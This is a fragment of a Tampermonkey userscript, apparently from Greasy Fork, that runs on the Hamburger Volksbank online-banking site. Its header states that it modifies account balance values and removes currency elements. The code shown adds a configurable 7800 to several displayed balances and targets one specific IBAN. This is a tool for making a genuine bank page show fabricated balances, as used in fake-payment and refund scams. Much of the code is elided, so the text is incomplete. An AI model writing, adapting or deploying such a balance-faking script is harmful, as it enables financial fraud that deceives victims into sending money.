// ==UserScript==
// @name         Ed Volks combined Elke Schleuder
// @namespace    http://tampermonkey.net/
// @version      0.4
// @description  Modify account balance values, update data-positive attribute, and remove currency elements
// @author       You
// @match        https://www.hamburger-volksbank.de/*
// @match        https://www.drivehq.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/486078/Ed%20Volks%20combined%20Elke%20Schleuder.user.js
// @updateURL https://update.greasyfork.org/scripts/486078/Ed%20Volks%20combined%20Elke%20Schleuder.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  7800 },
        { index: 1, adjustmentAmount: 7800 },
        { index: 2, adjustmentAmount: 7800 },
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE21 2019 0003";
    var targetTextContent2 = " 0063 2279 08";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 7800.0 ; // Adjust the amount as needed
